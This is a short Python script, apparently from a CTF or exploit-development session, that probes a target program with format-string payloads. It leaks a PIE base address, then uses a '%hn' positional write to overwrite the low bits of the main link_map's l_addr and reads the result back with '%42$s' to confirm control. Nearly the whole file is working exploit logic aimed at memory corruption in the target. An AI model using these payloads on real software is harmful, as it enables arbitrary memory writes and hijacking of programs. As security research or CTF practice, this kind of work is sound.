import re
from rprobe import run

# Verify that %42$hn writes into the main link_map (l_addr low 16 bits),
# by writing a distinctive value then leaking the bytes at link_map+0 via %42$s.
for rep in range(3):
    lk = run(hex(0x18a), '%p', 'B')[0]
    pie_lo = (lk >> 4) << 12
    print('pie_lo=%#x  (from OOB b1=%#x)' % (pie_lo, lk))
    lk2, out = run('1', '%1$4660c%42$hn', '%42$s')
    print('   total out len=%d ; bytes after padding: %r' % (len(out), out[4660:4660 + 40]))
    # also leak the ns_loaded pointer (arg 28) to confirm arg numbering
    lk3, out3 = run('1', '%p', '%42$s')
    print('   control (no write) bytes at linkmap+0: %r' % (out3[:16],))
